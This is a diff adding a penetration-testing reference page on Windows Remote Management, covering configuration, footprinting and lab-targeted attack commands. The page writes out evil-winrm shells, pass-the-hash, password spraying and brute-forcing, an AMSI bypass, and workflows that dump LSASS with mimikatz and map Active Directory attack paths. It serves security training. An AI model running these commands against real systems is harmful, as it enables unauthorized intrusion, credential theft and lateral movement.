@@ -1,0 +1,376 @@
+---
+title: WinRM
+description: Windows Remote Management - HTTP/HTTPS-based PowerShell remoting on TCP 5985/5986, Test-WsMan reachability checks, evil-winrm credentialed shells, pass-the-hash usage, and the credential-to-shell-on-Windows pattern WinRM enables.
+mitre: [T1046, T1078, T1021.006, T1059.001]
+d3fend: [D3-NTA, D3-MENCR]
+impact: [InternalAccess, RCE]
+sidebar:
+  order: 17
+  label: WinRM
+---
+
+## TL;DR
+
+WinRM (Windows Remote Management) is Microsoft's HTTP/HTTPS-based protocol for remote administration of Windows hosts. It implements the WS-Management standard over SOAP. Ports: **TCP 5985** (HTTP) and **TCP 5986** (HTTPS). With valid credentials, WinRM is the smoothest credentialed-RCE primitive on Windows - `evil-winrm` gives you an interactive PowerShell session in one command, with built-in tooling for file transfer and AMSI bypass.
+
+```
+# 1. Service scan
+nmap -sV -p5985,5986 <target>
+
+# 2. Probe with Test-WsMan (from a Windows attack box)
+Test-WsMan -ComputerName <target>
+
+# 3. Credentialed shell (Linux attack box)
+evil-winrm -i <target> -u <user> -p '<pass>'
+
+# 4. Pass-the-hash
+evil-winrm -i <target> -u <user> -H <NT-hash>
+
+# 5. HTTPS port if 5985 is firewalled
+evil-winrm -i <target> -u <user> -p '<pass>' -S -P 5986
+```
+
+Success indicator: `Test-WsMan` returns ProductVersion + ProductVendor without error, OR `evil-winrm` drops to an interactive `*Evil-WinRM* PS C:\Users\<user>\Documents>` prompt.
+
+## Protocol overview
+
+WinRM is Microsoft's implementation of [WS-Management](https://www.dmtf.org/standards/wsman) - a SOAP-based standard for managing distributed systems. It rides on top of HTTP/HTTPS, which makes it firewall-friendly (just allow ports 5985/5986) and provides a familiar HTTP-layer auth and encryption stack.
+
+| Port | Protocol | Transport encryption |
+| --- | --- | --- |
+| **TCP 5985** | HTTP | None at the HTTP level; WinRM negotiates AES-256 message-level encryption inside the HTTP stream after auth |
+| **TCP 5986** | HTTPS | TLS at the HTTP level (cert validation matters) |
+
+Despite port 5985 being "HTTP" (no TLS), the actual WinRM payloads inside it are encrypted at the message level - so the conversation isn't readable to passive sniffers as long as the negotiation succeeded. Port 5986 adds an additional outer TLS wrapper.
+
+### Authentication methods
+
+| Method | Available on | Use case |
+| --- | --- | --- |
+| **Negotiate (NTLM/Kerberos)** | Default for domain-joined Windows | Most common - your domain creds work transparently |
+| **Kerberos** | Domain environments | Better than NTLM; required for double-hop scenarios |
+| **CredSSP** | Optional, off by default | Allows credential delegation (the "second-hop" problem solved) |
+| **Basic** | Optional, off by default | Username + password sent (base64-encoded) in the HTTP header. Requires HTTPS. |
+| **Certificate** | Optional, off by default | Client cert + matching mapping on the server |
+
+For an operator with username + NTLM hash, the typical path is `Negotiate` with `NTLM` - works without Kerberos infrastructure and without needing the password itself (just the hash).
+
+### Permission model
+
+WinRM connections require:
+1. WinRM service running on the target (default off on workstations, default on on servers since 2012)
+2. The connecting account is in the **Remote Management Users** local group OR is a member of **Administrators**
+3. The WinRM listener configured to accept the appropriate auth method
+4. Firewall allows 5985/5986
+
+The `Remote Management Users` group is the intended scope - admins who can manage but aren't full local Administrators. In practice, in many environments, only Administrators have it, which means WinRM = local admin = credentials-to-SYSTEM is one mimikatz away.
+
+## Default configuration
+
+`winrm get winrm/config` shows the running configuration on a target Windows host. Operator-relevant defaults:
+
+```
+Config
+    MaxEnvelopeSizekb = 500
+    MaxTimeoutms = 60000
+    MaxBatchItems = 32000
+    MaxProviderRequests = 4294967295
+    Client
+        NetworkDelayms = 5000
+        URLPrefix = wsman
+        AllowUnencrypted = false              # blocks plaintext connections
+        Auth
+            Basic = true                       # client may use Basic auth
+            Digest = true
+            Kerberos = true
+            Negotiate = true
+            Certificate = true
+            CredSSP = false                    # CredSSP delegation off by default
+        DefaultPorts
+            HTTP = 5985
+            HTTPS = 5986
+        TrustedHosts                           # empty by default - Kerberos required
+    Service
+        RootSDDL = O:NSG:BAD:P(A;;GA;;;BA)(A;;GR;;;IU)S:P(AU;FA;GA;;;WD)(AU;SA;GWGX;;;WD)
+        MaxConcurrentOperations = 4294967295
+        MaxConcurrentOperationsPerUser = 1500
+        EnumerationTimeoutms = 240000
+        MaxConnections = 300
+        MaxPacketRetrievalTimeSeconds = 120
+        AllowUnencrypted = false              # service refuses plaintext
+        Auth
+            Basic = false                      # server doesn't accept Basic by default
+            Kerberos = true
+            Negotiate = true
+            Certificate = false
+            CredSSP = false
+            CbtHardeningLevel = Relaxed
+        DefaultPorts
+            HTTP = 5985
+            HTTPS = 5986
+        IPv4Filter = *
+        IPv6Filter = *
+        EnableCompatibilityHttpListener = false
+        EnableCompatibilityHttpsListener = false
+        CertificateThumbprint
+        AllowRemoteAccess = true
+```
+
+### What's enabled by default vs not
+
+- **`Service/AllowUnencrypted = false`** - server requires encryption (good)
+- **`Service/Auth/Basic = false`** - server won't accept Basic auth (good - Basic over HTTP is plaintext credentials)
+- **`Service/Auth/Negotiate = true`** - NTLM and Kerberos accepted (default and expected)
+- **`Service/Auth/CredSSP = false`** - no credential delegation (good)
+- **`Client/AllowUnencrypted = false`** - client won't send unencrypted (good)
+- **`Client/TrustedHosts =`** (empty) - by default, clients require Kerberos (which requires the target to be in DNS and resolvable via SPN). For non-domain-joined clients connecting by IP, this needs to be loosened.
+
+## Dangerous settings
+
+| Setting | What it enables |
+| --- | --- |
+| `Service/Auth/Basic = true` | Username/password sent in HTTP Basic auth header - base64, not encrypted. If `AllowUnencrypted = true` too, credentials in cleartext over the wire. |
+| `Service/AllowUnencrypted = true` | Negotiated AES-256 encryption can be bypassed - operator can sniff |
+| `Service/Auth/CredSSP = true` | Credential delegation enabled - compromise of one host can immediately reach others the user has authenticated to |
+| Wide `RootSDDL` ACL | The default grants Administrators full WinRM access; loosening it opens to lower-privilege users |
+| Wide `IPv4Filter` (`*`) without firewall | Anyone on the network can connect |
+| `CertificateThumbprint =` (empty) | Self-signed cert generated at first listener creation - clients can't easily validate |
+| WinRM enabled on workstations | Workstations don't usually need to accept remote management, but admins sometimes enable it network-wide |
+| WinRM listeners on multiple unrelated VLANs | Allows lateral movement across normally-isolated networks |
+
+## Footprinting commands
+
+### Service scan
+
+```shell
+sudo nmap 10.129.14.128 -sV -p5985,5986
+```
+
+```
+PORT     STATE SERVICE VERSION
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5986/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+```
+
+The version banner is `Microsoft HTTPAPI httpd 2.0` - that's the kernel-mode HTTP listener (HTTP.sys) that hosts the WinRM endpoint. Same banner appears for WSUS and various other Microsoft web services on different ports, so the port number is the distinguishing data.
+
+NSE script for HTTPS endpoint inspection:
+
+```shell
+nmap -p5986 --script ssl-cert,ssl-enum-ciphers 10.129.14.128
+```
+
+This dumps the cert subject (often reveals the hostname) and the TLS cipher policy.
+
+### Test-WsMan probe
+
+If you have a Windows attack host:
+
+```powershell
+Test-WsMan -ComputerName 10.129.14.128
+```
+
+Successful response:
+
+```
+wsmid             : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
+ProtocolVersion   : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
+ProductVendor     : Microsoft Corporation
+ProductVersion    : OS: 10.0.17763 SP: 0.0 Stack: 3.0
+```
+
+ProductVersion reveals OS version (`10.0.17763` = Server 2019). The Test-WsMan command works pre-auth - it just probes whether the WinRM service is responding. Unsuccessful response is usually:
+
+```
+Test-WsMan : <The client cannot connect to the destination specified in the request...>
+```
+
+Which means either: service down, firewall blocked, or the listener exists but only on a different transport/port than you tried.
+
+### Listing WinRM listeners
+
+From an authenticated session, see what's actually configured:
+
+```powershell
+winrm enumerate winrm/config/listener
+```
+
+```
+Listener
+    Address = *
+    Transport = HTTP
+    Port = 5985
+    Hostname
+    Enabled = true
+    URLPrefix = wsman
+    CertificateThumbprint
+    ListeningOn = 10.129.14.128, 127.0.0.1, ::1, fe80::e8a1:...
+
+Listener
+    Address = *
+    Transport = HTTPS
+    Port = 5986
+    Hostname = WIN-DC01.inlanefreight.htb
+    Enabled = true
+    URLPrefix = wsman
+    CertificateThumbprint = 1234567890ABCDEF...
+    ListeningOn = 10.129.14.128, 127.0.0.1, ::1, fe80::e8a1:...
+```
+
+Useful for understanding why a probe might be failing - if the HTTPS listener binds only to a specific hostname, IP-based connection attempts get rejected at the listener layer.
+
+### Credentialed shell - evil-winrm
+
+The defining WinRM tool. From a Linux attack box:
+
+```shell
+evil-winrm -i 10.129.14.128 -u Administrator -p 'P4ssw0rd!'
+```
+
+```
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+You're now in a remote PowerShell session as that user. Built-in commands within evil-winrm:
+
+| Command | What it does |
+| --- | --- |
+| `upload <local> <remote>` | Transfer file to target |
+| `download <remote> <local>` | Pull file from target |
+| `services` | List services |
+| `menu` | Show available evil-winrm functions |
+| `Invoke-Binary <PATH>` | Run a .NET binary loaded into memory (no disk write) |
+| `Donut-Loader -process_id <pid> -dll_path <path>` | Inject .NET assembly into existing process via Donut |
+| `Bypass-4MSI` | AMSI bypass (the in-process AV scan that catches mimikatz etc.) |
+| `Dll-Loader -dll_path <path>` | Load and execute a DLL in memory |
+
+Common operator workflow inside evil-winrm:
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/op/SharpHound.exe
+*Evil-WinRM* PS C:\Users\Administrator\Documents> .\SharpHound.exe -c All
+*Evil-WinRM* PS C:\Users\Administrator\Documents> download ./<output-of-sharphound>.zip
+```
+
+### Pass-the-hash with evil-winrm
+
+```shell
+evil-winrm -i 10.129.14.128 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+```
+
+Pass the NTLM hash directly with `-H`. No password needed. Works because WinRM's NTLM auth path doesn't actually need the plaintext password - the hash is what's used to compute the challenge response anyway.
+
+### HTTPS connection
+
+```shell
+evil-winrm -i 10.129.14.128 -u Administrator -p '<pass>' -S -P 5986
+```
+
+`-S` enables SSL (HTTPS, port 5986 by default but `-P` overrides). Use this when port 5985 is firewalled - port 5986 is often allowed in environments that have hardened against WinRM-over-HTTP.
+
+### Native PowerShell remoting
+
+From a Windows attack box (or `pwsh` on Linux):
+
+```powershell
+$cred = Get-Credential                     # prompts for username + password
+Enter-PSSession -ComputerName 10.129.14.128 -Credential $cred
+
+# Or with an explicit credential object
+$pw  = ConvertTo-SecureString 'P4ssw0rd!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator', $pw)
+Enter-PSSession -ComputerName 10.129.14.128 -Credential $cred
+
+# Run one command instead of entering a session
+Invoke-Command -ComputerName 10.129.14.128 -Credential $cred -ScriptBlock { whoami }
+```
+
+For non-domain-joined client, you'll need to set TrustedHosts first:
+
+```powershell
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value '10.129.14.128' -Force
+```
+
+### crackmapexec / netexec
+
+```shell
+# Test single credential
+crackmapexec winrm 10.129.14.128 -u Administrator -p 'P4ssw0rd!'
+
+# Pass-the-hash test
+crackmapexec winrm 10.129.14.128 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+
+# Spray across many users with one password
+crackmapexec winrm 10.129.14.128 -u users.txt -p 'Spring2024!'
+
+# Spray across many hosts with one credential (lateral movement check)
+crackmapexec winrm 10.0.0.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+
+# Execute a command without an interactive shell
+crackmapexec winrm 10.129.14.128 -u Administrator -p '<pass>' -x 'whoami'
+```
+
+The subnet form is the lateral-movement scan - for each cred you have, instantly map which other hosts in the network it works on.
+
+### Brute-force
+
+```shell
+crackmapexec winrm 10.129.14.128 -u users.txt -p passwords.txt
+```
+
+Or Hydra (less commonly used for WinRM but works):
+
+```shell
+hydra -L users.txt -P passwords.txt -m 'http-post-form-multipart' 10.129.14.128:5985
+```
+
+Most WinRM brute-force happens via `crackmapexec winrm` - purpose-built, faster, and the output is easier to parse.
+
+## Common chained workflows
+
+**SMB / SQL creds → WinRM lateral movement:**
+1. Recovered creds via SMB or SQL enumeration (see [SMB](/codex/network/services/smb/) / [MSSQL](/codex/network/services/mssql/))
+2. `crackmapexec winrm subnet/24 -u user -p pass` - see which hosts in the network the cred works on
+3. `evil-winrm` into the highest-value hit (DCs, file servers)
+
+**NTLM hash → PTH → WinRM shell:**
+1. mimikatz/secretsdump from a previously-shelled host yields NTLM hashes
+2. `evil-winrm -u <user> -H <hash> -i <target>` - no password needed
+3. Interactive shell on the target without ever knowing the plaintext
+
+**WinRM shell → AMSI bypass → mimikatz → more hashes:**
+1. `evil-winrm` in
+2. `Bypass-4MSI` defeats in-memory AV scanning
+3. `Invoke-Binary mimikatz.exe` loads mimikatz from your local path, runs in memory
+4. Dump LSASS for cached creds - usually finds the next set of usernames/hashes to spray with
+
+**SharpHound collection over WinRM:**
+1. `evil-winrm` in as a domain user
+2. `upload SharpHound.exe` (or run in-memory via Invoke-Binary)
+3. Collect AD data → BloodHound for graph analysis
+4. Identify attack paths from current creds to Domain Admin
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Service scan | `nmap -sV -p5985,5986 <target>` |
+| TLS cert / cipher | `nmap -p5986 --script ssl-cert,ssl-enum-ciphers <target>` |
+| Test reachability | `Test-WsMan -ComputerName <target>` (Windows) |
+| Interactive shell (password) | `evil-winrm -i <target> -u <user> -p '<pass>'` |
+| Interactive shell (hash) | `evil-winrm -i <target> -u <user> -H <NT-hash>` |
+| HTTPS variant | `evil-winrm -i <target> -u <user> -p '<pass>' -S -P 5986` |
+| Native PS remoting | `Enter-PSSession -ComputerName <target> -Credential $cred` |
+| One-shot command | `Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock { <cmd> }` |
+| Test creds | `crackmapexec winrm <target> -u <user> -p '<pass>'` |
+| Pass-the-hash test | `crackmapexec winrm <target> -u <user> -H <NT-hash>` |
+| Spray | `crackmapexec winrm <target> -u users.txt -p '<pass>'` |
+| Subnet scan with cred | `crackmapexec winrm 10.0.0.0/24 -u <user> -p '<pass>'` |
+| Exec command via cme | `crackmapexec winrm <target> -u <user> -p '<pass>' -x '<cmd>'` |
+| Upload (in evil-winrm) | `upload /local/path C:\\remote\\path` |
+| Download (in evil-winrm) | `download C:\\remote\\path /local/path` |
+| AMSI bypass (evil-winrm) | `Bypass-4MSI` |
